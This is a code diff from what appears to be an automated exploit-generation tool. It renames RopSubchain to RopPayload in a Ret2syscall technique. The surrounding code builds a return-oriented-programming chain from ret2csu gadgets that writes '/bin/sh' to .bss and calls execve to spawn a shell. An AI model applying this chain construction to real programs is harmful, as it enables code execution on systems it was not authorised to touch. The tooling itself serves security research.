@@ -52,7 +52,7 @@ bool Ret2syscall::checkRequirements() const {
     return Technique::checkRequirements() && m_syscallGadget;
 }
 
-std::vector<RopSubchain> Ret2syscall::getRopSubchains() const {
+std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
     const Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -60,14 +60,14 @@ std::vector<RopSubchain> Ret2syscall::getRopSubchains() const {
     assert(ret2csu);
 
     // read(0, elf.got['read'], 1), setting RAX to 1.
-    RopSubchain part1 = ret2csu->getRopSubchains(
+    RopPayload part1 = ret2csu->getRopPayloadList(
         m_syscallGadget,
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::GOT>(elf, "read"),
         ConstantExpr::create(1, Expr::Int64))[0];
 
     // syscall<1>(1, 0, 0), setting RAX to 0.
-    RopSubchain part2 = ret2csu->getRopSubchains(
+    RopPayload part2 = ret2csu->getRopPayloadList(
         m_syscallGadget,
         ConstantExpr::create(1, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64),
@@ -75,7 +75,7 @@ std::vector<RopSubchain> Ret2syscall::getRopSubchains() const {
 
     // syscall<0>(0, elf.bss(), 59),
     // reading "/bin/sh".ljust(59, b'\x00') to elf.bss()
-    RopSubchain part3 = ret2csu->getRopSubchains(
+    RopPayload part3 = ret2csu->getRopPayloadList(
         m_syscallGadget,
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::BSS>(elf),
@@ -83,15 +83,15 @@ std::vector<RopSubchain> Ret2syscall::getRopSubchains() const {
 
     // syscall<59>("/bin/sh", 0, 0),
     // i.e. sys_execve("/bin/sh", NULL, NULL)
-    RopSubchain part4 = ret2csu->getRopSubchains(
+    RopPayload part4 = ret2csu->getRopPayloadList(
         m_syscallGadget,
         BaseOffsetExpr::create<BaseType::BSS>(elf),
         ConstantExpr::create(0, Expr::Int64),
         ConstantExpr::create(0, Expr::Int64))[0];
 
-    RopSubchain ret1;
-    RopSubchain ret2;
-    RopSubchain ret3;
+    RopPayload ret1;
+    RopPayload ret2;
+    RopPayload ret3;
 
     ret1.reserve(1 + part1.size() + part2.size() + part3.size() + part4.size());
     ret1.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
